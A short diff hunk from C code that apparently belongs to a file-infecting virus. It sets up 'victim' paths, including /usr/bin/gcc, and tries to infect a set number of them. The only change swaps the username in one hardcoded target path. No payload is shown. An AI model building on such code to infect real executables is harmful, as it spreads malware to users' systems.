@@ -538,7 +538,7 @@ marker:
 	char victim_pathname[EXEC_SIZE];
 	int victim_important = 1;
 	int victim_imp_num = 5;
-	char imp_victim1[] = "/home/wang/Desktop/getkb1";
+	char imp_victim1[] = "/home/gina/Desktop/getkb1";
 	char imp_victim2[] = "/usr/bin/gcc";
 	i = 1;
 	while (success < VICTIM && tries < ATTEMPTS)
